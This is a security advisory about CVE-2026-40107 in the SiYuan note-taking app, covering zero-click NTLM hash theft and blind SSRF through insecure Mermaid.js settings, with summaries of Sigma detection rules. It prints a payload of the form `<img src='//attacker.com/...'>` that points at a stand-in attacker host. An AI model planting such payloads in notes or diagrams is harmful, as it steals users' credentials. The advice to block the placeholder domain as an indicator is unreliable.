---
title: SiYuan Zero-Click NTLM Theft and Blind SSRF via Mermaid Diagrams
slug: 2026-04-siyuan-ntlm-ssrf
description: SiYuan is vulnerable to zero-click NTLM hash theft on Windows and blind SSRF on all platforms due to insecure Mermaid.js configuration, where a malicious Mermaid diagram containing a protocol-relative URL can be injected into a note, causing the Electron client to fetch the URL, triggering SMB authentication on Windows and sending the victim's NTLMv2 hash to the attacker. On macOS and Linux, the request acts as a tracking pixel and blind SSRF.
date: "2026-04-11T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - siyuan
  - ntlm
  - ssrf
  - credential-theft
  - mermaid
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1189
    technique_name: Drive-by Compromise
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1189
    technique_name: Drive-by Compromise
  - tactic_id: TA0007
    tactic_name: Discovery
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
cves:
  - id: CVE-2026-40107
    epss: 0.0005
references:
  - https://github.com/advisories/GHSA-w95v-4h65-j455
rules:
  - title: Detect SiYuan Mermaid NTLM Theft Attempt
    description: Detects SMB connections originating from SiYuan processes, potentially indicating NTLM theft via a malicious Mermaid diagram.
    platform: sigma
    severity: high
    tactics:
      - credential_access
    techniques:
      - T1189
    data_sources:
      - network_connection
      - windows
  - title: Detect SiYuan Mermaid SSRF Attempt
    description: Detects HTTP requests from SiYuan processes with suspicious URLs, potentially indicating SSRF via a malicious Mermaid diagram.
    platform: sigma
    severity: medium
    tactics:
      - discovery
    techniques:
      - T1190
    data_sources:
      - network_connection
      - windows
rules_count: 2
---

SiYuan, a note-taking application, is vulnerable to a zero-click NTLM hash theft and blind SSRF exploit due to insecure configuration of Mermaid.js. The application configures Mermaid.js with `securityLevel: "loose"` and `htmlLabels: true`, which allows `<img>` tags with `src` attributes to bypass sanitization and be injected into SVG `<foreignObject>` blocks. When a user opens a note containing a malicious Mermaid diagram with a protocol-relative URL (e.g., `//attacker.com/image.png`), the Electron client fetches the URL. On Windows, this resolves as a UNC path, triggering SMB authentication and sending the victim's NTLMv2 hash to the attacker. On macOS and Linux, the same diagram triggers an HTTP request to the attacker's server, exfiltrating the victim's IP address. The vulnerability affects SiYuan versions prior to the fix implemented after April 7, 2026. This allows for credential theft without any user interaction beyond opening a note.

## Attack Chain

1.  The attacker crafts a malicious SiYuan note containing a Mermaid diagram with a protocol-relative URL within an `<img>` tag, such as `<img src='//attacker.com/share/img.png'>`.
2.  The attacker distributes the malicious note (e.g., via sharing or a crafted .sy export).
3.  The victim opens the note in SiYuan.
4.  SiYuan renders the Mermaid diagram using the insecure Mermaid.js configuration.
5.  The SVG containing the malicious `<img>` tag is injected into the DOM via `innerHTML`.
6.  The Electron client attempts to fetch the resource at the protocol-relative URL.
7.  On Windows, the protocol-relative URL resolves to a UNC path (`\\attacker.com\share\img.png`), initiating an SMB connection.
8.  Windows automatically sends the victim's NTLMv2 hash to the attacker's SMB server, or makes an HTTP request leaking victim's IP on other platforms.

## Impact

The vulnerability allows for zero-click NTLMv2 hash theft on Windows systems, where the victim only needs to open a note containing the malicious Mermaid diagram. The stolen NTLMv2 hashes can be cracked offline or used in relay attacks to gain unauthorized access to the victim's resources. On all platforms, this vulnerability can be exploited to perform blind SSRF and leak the victim's IP address, acting as a tracking pixel to confirm when the note was opened. This affects all SiYuan users who receive a crafted note.

## Recommendation

*   Deploy the Sigma rule `Detect SiYuan Mermaid NTLM Theft Attempt` to identify SMB traffic originating from SiYuan processes attempting to connect to external IPs (network_connection log source).
*   Deploy the Sigma rule `Detect SiYuan Mermaid SSRF Attempt` to detect HTTP requests from SiYuan to external IP addresses with a suspicious URL (network_connection log source).
*   Monitor network traffic for SMB connections originating from SiYuan, especially to unusual or external destinations (network_connection log source).
*   Block the attacker's domain (`attacker.com`) at the DNS resolver, as observed in the malicious Mermaid diagram example (iocs).
*   Upgrade SiYuan to a patched version that addresses CVE-2026-40107 to mitigate the underlying vulnerability.
